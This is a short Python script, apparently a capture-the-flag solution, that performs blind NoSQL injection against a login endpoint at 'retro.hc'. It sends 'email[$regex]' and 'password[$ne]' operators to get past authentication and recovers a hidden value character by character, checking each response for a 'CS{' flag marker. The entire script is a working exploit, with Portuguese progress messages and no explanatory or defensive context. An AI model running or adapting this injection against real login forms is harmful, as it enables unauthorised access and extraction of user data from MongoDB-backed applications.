import requests
import string

url = "http://retro.hc/login/"

chars = string.printable

def extract(atual, anterior):
    data = {"email[$regex]": atual + anterior, "password[$ne]": "a"}
    r = requests.post(url, data=data)
    return r.text

def main():
    valor_completo = "^"
    while True:
        encontrou = False
        for printable in chars:
            if printable in ['*', '+', '.', '?', '|', '\\', '^', '$', '{', '}', '(', ')', '[', ']']:
                continue
            result = extract(valor_completo, printable)
            if "CS{" in result:
                valor_completo += printable
                encontrou = True
                print(f"[+] Encontrado: {valor_completo}")
                break
            print(f"[-] Testando: {valor_completo + printable}")
        if not encontrou:
            print(f"\n[✔] Valor completo extraído: {valor_completo[1:]}")
            break

main()
